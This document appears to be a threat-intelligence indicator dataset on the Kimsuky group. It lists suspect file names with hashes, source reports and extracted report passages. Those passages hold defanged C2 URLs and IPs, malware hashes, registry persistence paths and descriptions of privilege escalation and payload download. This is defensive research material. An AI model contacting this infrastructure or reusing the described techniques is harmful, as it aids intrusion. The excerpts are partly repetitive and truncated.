攻击。韩国原子能研究院拥有核电站、核燃料等重要国防资料。根据披露信息 显示，攻击者利用原子能研究院 VPN 设备漏洞进入内网，使用了 13 个未经授权的外部 IP 访问 VPN 内部网络。",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:88c23830827b3a02ae1ddcf317212069b3220cc2a49bf1374a14342ec9737c5e,observation--sha256:4fde343a842dcab47529c1f8102ffbb75fd9001e73009a39184cdca41da5a68d,file-name,comhost.exe,comhost.exe,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 5}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 3.2 第二阶段：木马安装 攻击者前后开发了多个类似的木马，作者观察到在部分组件中携带有 Pdb 路径，疑似 多名开发者协同工作。 D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\splwow64_poc.pdb D:\MyWork\PrevWork\ 취 약 점 자 료 \IE\2021\Work\Final\splwow64_poc\x64\Release\DLL.pdb I:\splwow64_poc\Release\CreateDC.pdb I:\splwow64_poc\x64\Release\DLL.pdb C:\Users\Administrator\Downloads\Win32Project1\x64\Release\Win32Project1.pdb X:\MyWork\PrevWork\VC Attack Program\MakeMail\Release\MakeMail.,
1.0.0,actor--kimsuky,artifact--sha256:88c23830827b3a02ae1ddcf317212069b3220cc2a49bf1374a14342ec9737c5e,observation--sha256:95c4efeb24a681dcde70c7d12be155b05e4b1b1c1148dbf94dacf5a703e472b7,file-name,comhost.exe,comhost.exe,candidate,2021-07-01T00:00:00Z,month,inferred,report-observation-window,2021-07-01T00:00:00Z,source--kgh-2021,kimsuky/Kimsuky-KGH.pdf,"{""page"": 6}",[],"[""malware--kgh""]","[""infra--compromised-web-servers""]","[""c2"",""payload""]",0,false,high,TLP:CLEAR,pdf-text,"微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[5] . 向系统目录拷贝 如果复制成功将会直接执行，否则会检查 speed3.exe 路径是否包含 Low 字符串，如果 不包含，则会复制到 C:\Users\<user>\AppData\Local\comhost.exe 执行，并以字符串""Level Medium-->Path""作为日志标识。 如 果 包 含 Low 字 符 串 ， 则 会 利 用 漏 洞 CVE_2019_0880 进 行 提 权 ， 将%Temp%\speed1.dll 通过注入的方式以高权限执行。 图[6] . 漏洞 CVE_2019_0880 expolit 反汇编代码片段 被 注 入 执 行 的 speed1.dll ， 从 Temp 目 录 寻 找 %Temp%\low\pay.exe 或 者 %Temp%\pay.exe （ 间 谍 模 块 ） ， 将 其 复 制 到 C:\Users\<user>\AppData\Local\comhost.exe 并执行。",
1.0.0,actor--kimsuky,artifact--sha256:9b768a80adf58e99dfac90b48fdd4c012a78330b71d88cff889e9a62fda6fbcc,observation--sha256:c65cc9e039f2b6d2234de4cdc8dbb104d6f4fdf0b08701841eae3da91ed04726,file-name,conf.php,conf.php,candidate,2022-05-13T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 57}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.11. C2도메인유사도 ○C2 도메인에서도유사도를확인할수있으며, VBS 1 / JSE 1 유형의도메인은작년5월안랩에서공개한Kimsuky보고서 의C2도메인과유사한형태가사용됐었습니다. 10 ○JSE 1 유형부터는C2 도메인형태에변화가있었고이후유형들은기존의Kimsuky도메인유형과는달라졌으며, 점차단순화되는형태를띄고있습니다. [표4-5] C2도메인유사도 10 Ahnlab- 다양한주제의보도자료를사칭한Kimsuky공격시도 Genians SecurityCenter 56 유형 날짜 C2Domain Kimsuky 2022-05-13 mc[.]pzs.kr/themes/mobile/images/about/temp/upload/list.php?query=1 VBS1 2022-02-09 sktelecom[.]help/download/select.php?type=12022-03-15 encorpost[.]com/post/post.php?type=12022-0",
1.0.0,actor--kimsuky,artifact--sha256:6f91413f6ecdc28645cd1a37fdeefa6158f77cf2f3d90f3f2f8a171509fc092b,observation--sha256:571ef2b823dacfaca6c8fbf73fa1d39ee92e613440f333667193ff7651613451,file-name,config.php,config.php,candidate,2022-05-13T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 57}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.11. C2도메인유사도 ○C2 도메인에서도유사도를확인할수있으며, VBS 1 / JSE 1 유형의도메인은작년5월안랩에서공개한Kimsuky보고서 의C2도메인과유사한형태가사용됐었습니다. 10 ○JSE 1 유형부터는C2 도메인형태에변화가있었고이후유형들은기존의Kimsuky도메인유형과는달라졌으며, 점차단순화되는형태를띄고있습니다. [표4-5] C2도메인유사도 10 Ahnlab- 다양한주제의보도자료를사칭한Kimsuky공격시도 Genians SecurityCenter 56 유형 날짜 C2Domain Kimsuky 2022-05-13 mc[.]pzs.kr/themes/mobile/images/about/temp/upload/list.php?query=1 VBS1 2022-02-09 sktelecom[.]help/download/select.php?type=12022-03-15 encorpost[.]com/post/post.php?type=12022-0",
1.0.0,actor--kimsuky,artifact--sha256:6f91413f6ecdc28645cd1a37fdeefa6158f77cf2f3d90f3f2f8a171509fc092b,observation--sha256:ffc1973357aa7c9818c20c1ed1ce55a20b120aa5d91074bbcf1ce0e2cc8b2364,file-name,config.php,config.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 12}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ usesignal.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ www.bluemotion.co.kr/cheditor4/insert_link.php ÿ www.scabm.co.kr/gnuboard4/bbs/view_coma.php ÿ kakaoreug.info/tygygvftsfx8g68Gu8x7s78gsvseidj6.php ÿ bstill.kr/gnuboard4/bbs/view_coma.php 12 ÿ afgvillage.eu/tygygvftsfx8g68Gu8x7s78gsx6.php ÿ listmember.info/tygygvftsfx8g68Gu8x7s78gsx6519.php ÿ kakaocore.eu/tygygvftsfx8g68Gu8x7s78gsxueidj6.php ÿ www.mykoces.com/gnuboard4/bbs/view_coma.php ÿ e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6f91413f6ecdc28645cd1a37fdeefa6158f77cf2f3d90f3f2f8a171509fc092b,observation--sha256:4b914c487f583f762ca12dd659771b1a1ec8c1d67d6fdc7b85b607d60bcafdbc,file-name,config.php,config.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 13}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"ÿ navernail.eu/ewf43fewfwf4tfw4/wf7weyr892hfwogewgsfg3.php 27.255.80.170(KR) 27.102.114.89(KR) 216.189.149.71(US) ÿ www.ssktool.co.kr/ssktool/20090401skin/chinese/quick/L_quick.php 59.7.91.171(KR) ÿ www.namastte.kr/sources/Util/AJAX.php 211.53.197.220(KR) 27.255.75.137(KR) We contacted the site administrator by email to analyze the cause of the upload, but we did not receive any feedback. Operation Covert Stalker Report 1.243.200.130(KR) 185.176.43.106(BG) 27.102.107.63(KR) 27.255.81.80(KR) 162.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6f91413f6ecdc28645cd1a37fdeefa6158f77cf2f3d90f3f2f8a171509fc092b,observation--sha256:4bf569d2ff6b3cea4d87096b85bfeb042a25bf7deb8b8825e6f293d57b4b14eb,file-name,config.php,config.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6f91413f6ecdc28645cd1a37fdeefa6158f77cf2f3d90f3f2f8a171509fc092b,observation--sha256:408248b1c23375d6e55670f04dffd8778a957ddb65a7c777da9c61b5aa315263,file-name,config.php,config.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 88}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"V3 diagnosis name Consent Form_Princeton Study.pdf Zoom meeting information Opinions on the unification of the Korean Peninsula and the situation in neighboring countries This is the blocking log. pbA== _MAL_BLOCK North Korea's Nuclear Threat: South Korea's Perceptions and US Deterrence of Nuclear Expansion This is a document containing information related to the state of affairs in the country. We must build a prosperous homeland.docx When executing a malicious batch file, it is part of the dec",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6f91413f6ecdc28645cd1a37fdeefa6158f77cf2f3d90f3f2f8a171509fc092b,observation--sha256:ea5695177ddb77db169301f6d5e0bb932a96113fb0b52ba757f853e824296673,file-name,config.php,config.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 89}",[],[],[],[],1,false,medium,TLP:CLEAR,pdf-text,"7. Epilogue The market share of older versions of Windows for which Microsoft's technical support ended, such as in 2008, continues to decline. However, domestic restrictions (Figure 68) C2 in LighShell The parameter values that make up the phishing URL include Eid as the email address of the hacking target encoded in BASE64, and tu (normal URL) as the normal Naver electronic document URL encoded in BASE64 (hxxps://invoice.naver.com/main?from= mail) is saved. As can be seen from the file name, N",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6f91413f6ecdc28645cd1a37fdeefa6158f77cf2f3d90f3f2f8a171509fc092b,observation--sha256:1517e98f70c31b9204f2ce44f3c612ed2d8d32617a4c1f7cebf84b47a8a40de3,file-name,config.php,config.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 395}",[],[],[],[],1,false,medium,TLP:CLEAR,text-line,-[ config.php:,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:42694e159743f6a486aa699744802cd7a9ab9caf857fd86a9144ff8a3d72fbb5,observation--sha256:af5fdf806be41064f527c884263a45f646e821abfc7ea0ecfb9e8dbf59144ec6,file-name,consent.exe,consent.exe,candidate,2021-11-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 71}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(2) certuser.info In the table below (Table 36), hxxp://bipaf.org is the C2 through which the malicious document (MD5: 90a56bc6a66bb4e02265389529757460) communicates, and namastte has been hacked by the Kimsuky organization since November 2021, before April 2022, which was recognized by AhnLab. Abuse with C2 (Table 36) Malicious behavior log of 21*.16*.25*.5*(KR) A total of 45 malicious URLs with similar patterns were mapped to 21*.9*.1*.16*(KR) where certuser.info was mapped. 71 22*.15*.24*.13*",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e85bc51554c03fa547d5f73f9f7f62cb0705fae876eafb6c046c108d96f8ea11,observation--sha256:24475d4032c579aedf93bc740239498ca63155701655d407546afe5416eac547,file-name,copy.vbs,copy.vbs,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 79}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(Figure 61) Example of files created in the Check folder Trojan/VBS.Kimsuky Trojan/VBS.Akdoor.S2202 Below (Table 46) is the diagnosis made by the antivirus installed by the Kimsuky organization when testing malware in 17*.11*.22*.18*(US). C:\Users\DefaultUser\Downloads\info_sc_org1 - 20230321053830 C:\Users\Administrator\Downloads\passwod.txt.lnk e\16.0\Exported\{015223D7-1E1C-4B92-9ED7- Even if you enter an incorrect parameter value, the file is not deleted. Like list.php, it is determined by t",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bd40d0776370af7315a5c04b15b395b2673fcce36928dba1463eac26df6f90ca,observation--sha256:53fc24ec0fcc0301499c91a964b1d8203ae21b924c947a10faac2820c9b12c5c,file-name,cow.php,cow.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 12}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 6] Comparison of malicious scripts found home and abroad In particular, the above figure shows that the function styles used by PowerShell as well as the file names ('expres.php?op=1', 'cow.php?op=1"") and parameters used to communicate with the C2 server are very similar in both scripts.",
1.0.0,actor--kimsuky,artifact--sha256:bd40d0776370af7315a5c04b15b395b2673fcce36928dba1463eac26df6f90ca,observation--sha256:b6d04cafe9fb12c7ca5282822221ad0ca3fef6ea2e5d6499a1613a38bd1ef1fc,file-name,cow.php,cow.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:bd40d0776370af7315a5c04b15b395b2673fcce36928dba1463eac26df6f90ca,observation--sha256:1fc429e7b5db0e12a288f758abba2249d329ee1e49e3f5e6c894fca87fecba2e,file-name,cow.php,cow.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 17}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- https://login-main.bigwnet[.]com/attachment/view/Msgxo.hta - https://login-main.bigwnet[.]com/attachment/view/expres.php?op=2 - https://mohanimpex[.]com/include/tempdoc/891250/doc.php - https://mohanimpex[.]com/include/tempdoc/891250/Ersrr0.hta - https://mohanimpex[.]com/include/tempdoc/891250/expres.php?op=1 - https://mohanimpex[.]com/include/tempdoc/891250/Pkjjy.hta - https://mohanimpex[.]com/include/tempdoc/891250/upload.php - https://mohanimpex[.]com/include/tempdoc/891250/image.png - http,
1.0.0,actor--kimsuky,artifact--sha256:bd40d0776370af7315a5c04b15b395b2673fcce36928dba1463eac26df6f90ca,observation--sha256:857336526e919c27ea7019b754e3cda317117041511d31e3e1ad1f93ae3b85be,file-name,cow.php,cow.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 8}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 2] Screen displayed after executing the malicious document written in Korean The malicious document contains files range from 'activeX1.bin' to 'activeX10.bin'. The file 'activeX2.bin' is the one that has the communication host addresses as follows, and it tries the additional C2 communication by means of HTA commands and conditions. - https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/Htqgf0.hta - https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/expres.php?op=1 - https://t",
1.0.0,actor--kimsuky,artifact--sha256:bd40d0776370af7315a5c04b15b395b2673fcce36928dba1463eac26df6f90ca,observation--sha256:2047463d753a421da34ff7bbfa7cb06286ed36029f4d7875524f48ecf2c16f86,file-name,cow.php,cow.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 9}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[Figure 3] Code of 'activeX2.bin' file Another variant with the same name as the 'TaskForceReport.doc' (MD5: 0f77143ce98d0b9f69c802789e3b1713) file has been propagated in March. - https://christinadudley[.]com/public_html/includes/common/Qfnaq0.hta - https://christinadudley[.]com/public_html/includes/common/expres.php?op=1 - https://christinadudley[.]com/public_html/includes/common/cow.php?op=Normal.src - https://christinadudley[.]com/public_html/includes/common/Normal.src - https://christinadud,
1.0.0,actor--kimsuky,artifact--sha256:bd40d0776370af7315a5c04b15b395b2673fcce36928dba1463eac26df6f90ca,observation--sha256:79eb8f711e9d8f324881a64253ce1499b3335cf74d6d630b43e4ae907534542d,file-name,cow.php,cow.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--2712defa6fbe4d81,kimsuky/kimsuky-note.txt,"{""line"": 29}",[],[],[],[],1,false,medium,TLP:CLEAR,text-line,cow.php,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:efe6df7bc01ee18e493d78ab1c1be592b170cd1daf0629d01bb5aaf5e007caa9,observation--sha256:93c61a04d5b38ef08aa322672ec0e1cde6e76799bbd236247d2d3c1a3f45a433,file-name,csrss.exe,csrss.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:a9cca91688e1c653739ec0163b889739533dbd58d29fb0495d37db674b36c0ab,observation--sha256:3ea6ae18087c4bbf2d5012acb1aed3a354f832fed4217593ba5d635abfcd40c8,file-name,ctfmon.exe,ctfmon.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 44}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○최종실행되는코드는아래와같습니다. 매개변수의길이가0보다클경우, 해당JSE파일을레지스트리자동실행경로에등록합니다. HTML파일의스크립트에서해당JSE파일을실행할때매개변수로“P” 를사용했기때문에조건문은참이됩니다. ○ 레지스트리에 추가된 뒤 자동 실행될 경우에는 매개변수가 주어지지 않기때문에else 에 해당하는 코드가 실행되며, Powershell 을 통해 C2 서버에서 “ctfmon.exe”파일을다운로드하고실행합니다. [그림4-18] JSE2유형의JSE코드 [그림4-19] JSE2유형탐지 Genians SecurityCenter 43",
1.0.0,actor--kimsuky,artifact--sha256:a9cca91688e1c653739ec0163b889739533dbd58d29fb0495d37db674b36c0ab,observation--sha256:bac813a4940a7f4c22947c146e204821a35ecec6f9259aaf8b5243a02f7d0e72,file-name,ctfmon.exe,ctfmon.exe,candidate,2022-03-01T00:00:00Z,month,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 54}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.8. 경로및파일명유사도 ○VBS 1 유형부터JSE 3 유형까지는동일한레지스트리경로및레지스트리이름을사용했으며, JSE 4 유형부터 “Document” 가 아닌 “Update” 라는 레지스트리 이름을사용하고있습니다. ○또한, DAT, VBS, JSE 파일의이름및저장경로에서높은유사도를보이고있으며,JSE2유형부터는JSE파일명과경로에변화를준사실을확인할수있습니다. [표4-2] 경로및파일명유사도 Genians SecurityCenter 53 유형 탐지날짜 CHM파일명 레지스트리경로 DAT파일경로 VBS/ JSE파일경로 페이로드경로 VBS1 2022-03 User Guide.chmasset.chmwages.chm HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Document %USERPROFILE%\Links\Document.dat %USERPROFILE%\Links\Document.vbs %tmp%\a",
1.0.0,actor--kimsuky,artifact--sha256:e5da8c637431019cfd798b0c789bddacea91bd1333fd2b300fef0611db5b1b12,observation--sha256:b65e5ebacc6da7bad1a27a51dc79da64e7fbf783d4d3b48af3c70e4f0d074f35,file-name,d.php,d.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ Temp folder image File, Kakao (Daum) phishing mailer As a result of deactivation and analysis, malicious macros were present. (Analysis data) North Korea's position on the use of nuclear force as seen through the April 25 military parade and When executed, additional malicious code is downloaded and executed, and the structure is the same as ""(Figure 26) Malicious code infection process"" above . [+] Joint security advisory from the National Intelligence Service (NIS) and the German Office for ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:e5da8c637431019cfd798b0c789bddacea91bd1333fd2b300fef0611db5b1b12,observation--sha256:083a35a8f3342c9e6d452010f847a294a9646624de62fb27732dbcebb7a1244b,file-name,d.php,d.php,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 7 HackTool/Win.RdpScan (2021.08.17.03) 64c97f485939ed66b13df5d7880d0757 result.lnk Backdoor/Win.AppleSeed (2022.06.22.01) 9b5add63dc12bc6c7028c6abf08c6ffd 6b3235a4c55aba4f6ffbf6f86f9c31e6 Dropper/LNK.Kimsuky.S2172 (2023.03.22.00) first (2).txt 74f1f1ba400ab3a0882927f81e3ea62e d.php Infostealer/Script.Agent (2023.10.19.01) shadow.exe Malware/PS.Generic.SC180735 (2023.10.18.01) viso.exe 7175e046767725b2f8d93f8a69a9999f 71f8ac92adf5af2357594446e85db30a Trojan/VBS.Kim,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:32e6c77bd5707ee2d48b8f0988eca3fb30513a992bdf187900f07638392f6547,observation--sha256:7de81e2f6544c772b16a23396c1d4dbc7b7eb495a69fdf4aab4e2686f4e15f57,file-name,data.zip,data.zip,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ Temp folder image File, Kakao (Daum) phishing mailer As a result of deactivation and analysis, malicious macros were present. (Analysis data) North Korea's position on the use of nuclear force as seen through the April 25 military parade and When executed, additional malicious code is downloaded and executed, and the structure is the same as ""(Figure 26) Malicious code infection process"" above . [+] Joint security advisory from the National Intelligence Service (NIS) and the German Office for ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5969c8bc6a3f5b7a68ae641cf257d78a84eae6e5536fb4d376b7520fd9eafaa2,observation--sha256:b1dc8e7b0f6d673d1c7f2708ac19a4f287eed6bd0e6a2ea571cdccc0a67b2c98,file-name,db.php,db.php,candidate,2022-05-13T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 57}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.11. C2도메인유사도 ○C2 도메인에서도유사도를확인할수있으며, VBS 1 / JSE 1 유형의도메인은작년5월안랩에서공개한Kimsuky보고서 의C2도메인과유사한형태가사용됐었습니다. 10 ○JSE 1 유형부터는C2 도메인형태에변화가있었고이후유형들은기존의Kimsuky도메인유형과는달라졌으며, 점차단순화되는형태를띄고있습니다. [표4-5] C2도메인유사도 10 Ahnlab- 다양한주제의보도자료를사칭한Kimsuky공격시도 Genians SecurityCenter 56 유형 날짜 C2Domain Kimsuky 2022-05-13 mc[.]pzs.kr/themes/mobile/images/about/temp/upload/list.php?query=1 VBS1 2022-02-09 sktelecom[.]help/download/select.php?type=12022-03-15 encorpost[.]com/post/post.php?type=12022-0",
1.0.0,actor--kimsuky,artifact--sha256:d1b620219d79b11913546dcae8a8761c82e35f33acb5a7ce347d70d85f179e06,observation--sha256:0f339d53cd6e2ec536b6d2a7f06cde250c105dbde4fff418b0f9f0910052633a,file-name,default-ssl.conf,default-ssl.conf,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 673}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,work/mnt/hgfs/Desktop/New folder/vps1/sites-available/default-ssl.conf,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b7404fa8ab6fd08d0a531b905967d10c4d81ef9ea386c206032c124dec7666ee,observation--sha256:1ae4af55ac38640016249affe42a297449a5fd81aba7c5eed1c1b163522c5fb5,file-name,defaultes_x64.dll,defaultes_x64.dll,candidate,2023-02-24T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 82}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"82 2023-02-24 %SystemDrive%\users\%ASD%\downloads\ eternal_bin\defaultes_x64.dll dns_x86.dll 11:49:15 11:49:15 (Table 47) Vaccine diagnosis log of 6*.9*.20*.24*(KR) Even taking this into account, the structure of the C2 communication header was judged to be very similar to past malware. dll %SystemDrive%\users\%ASD%\downloads\ %SystemDrive%\users\%ASD%\downloads\ defaults_x64. 11:49:16 dns_x64.dll Operation Covert Stalker Report %SystemDrive%\users\%ASD%\downloads\ eternal_bin\dnsadmin_x86_2003.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b7404fa8ab6fd08d0a531b905967d10c4d81ef9ea386c206032c124dec7666ee,observation--sha256:12293010b00c3e614fdae1519103fdfb8a8affcaaa047a01e3c0bbf252a2f4df,file-name,defaultes_x64.dll,defaultes_x64.dll,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Operation Covert Stalker Report 9 auto_n.php HackTool/Win.RdpScan (2021.08.17.03) e840bf3477150392720fe8a9b1f8a4d6 result.txt.lnk fff43c6690eb87eb194aae01d6d77f1e dd6b31c3a9881eb64b719568a53cb2fb enc(2).txt North Korea's position on the use of nuclear weapons and Trojan/Win32.NsSpy (2017.09.14.00) Kang Jeong-il, authoritarianism HackTool/Script.Agent.SC193455 (2023.10.19.00) f082f689394ac71764bca90558b52c4e RdpAttack_Ksb04_x64.exe index.php tmp1030574661.vbs enc.txt 